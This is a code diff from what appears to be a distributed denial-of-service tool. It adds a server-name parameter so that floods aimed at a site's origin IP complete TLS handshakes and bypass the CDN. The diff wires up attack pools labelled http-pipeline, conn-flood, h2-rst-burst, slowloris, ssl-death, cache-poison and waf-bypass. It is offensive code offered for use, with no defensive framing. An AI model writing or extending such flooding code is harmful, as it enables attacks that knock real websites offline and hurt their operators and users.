@@ -511,6 +511,7 @@ function spawnPool(
   method: string, target: string, port: number, threads: number,
   numWorkers: number, signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
   onCodes?: (codes: LiveCodes, latAvgMs: number) => void,
+  sni?: string,
 ): Promise<void> {
   // OOM Guard 1: cap workers per pool
   numWorkers = Math.min(numWorkers, MAX_WORKERS_PER_POOL);
@@ -561,7 +562,7 @@ function spawnPool(
       // Deployed (8-32GB RAM): 1024MB → full power, workers rarely hit this ceiling.
       // Dev (2GB total):       128MB → 14 workers × 128 = 1792MB, still safe on 4GB Replit.
       const workerOpts: import("worker_threads").WorkerOptions = {
-        workerData: { method, target, port, threads: t, proxies },
+        workerData: { method, target, port, threads: t, proxies, ...(sni ? { sni } : {}) },
         resourceLimits: { maxOldGenerationSizeMb: IS_DEPLOYED ? 1024 : 128 },
       };
       const w = new Worker(WORKER_FILE, workerOpts);
@@ -981,12 +982,12 @@ async function runAttackWorkers(
       const wafT_ob   = Math.max(80, cdnT - cacheT_ob);
 
       await Promise.all([
-        // ── Front 1: direct origin IP attack ─────────────────────────────
-        spawnPool("http-pipeline",  originIP, 80,  pipeT_ob,  Math.max(4, CPU_COUNT),                   signal, onStats),
-        spawnPool("conn-flood",     originIP, 443, connT_ob,  1,                                         signal, onStats),
-        spawnPool("h2-rst-burst",   originIP, 443, h2rstT_ob, Math.max(4, CPU_COUNT),                   signal, onStats),
-        spawnPool("slowloris",      originIP, 80,  slowT_ob,  1,                                         signal, onStats),
-        spawnPool("ssl-death",      originIP, 443, sslT_ob,   2,                                         signal, onStats),
+        // ── Front 1: direct origin IP attack (sni=hostname so TLS handshake succeeds RFC-6066)
+        spawnPool("http-pipeline",  originIP, 80,  pipeT_ob,  Math.max(4, CPU_COUNT),                   signal, onStats, undefined, hostname),
+        spawnPool("conn-flood",     originIP, 443, connT_ob,  1,                                         signal, onStats, undefined, hostname),
+        spawnPool("h2-rst-burst",   originIP, 443, h2rstT_ob, Math.max(4, CPU_COUNT),                   signal, onStats, undefined, hostname),
+        spawnPool("slowloris",      originIP, 80,  slowT_ob,  1,                                         signal, onStats, undefined, hostname),
+        spawnPool("ssl-death",      originIP, 443, sslT_ob,   2,                                         signal, onStats, undefined, hostname),
         // ── Front 2: CDN edge cache exhaustion ───────────────────────────
         spawnPool("cache-poison",   target,   port, cacheT_ob, 2,                                         signal, onStats),
         spawnPool("waf-bypass",     target,   port, wafT_ob,   Math.max(4, Math.floor(CPU_COUNT / 2) + 2), signal, onStats),
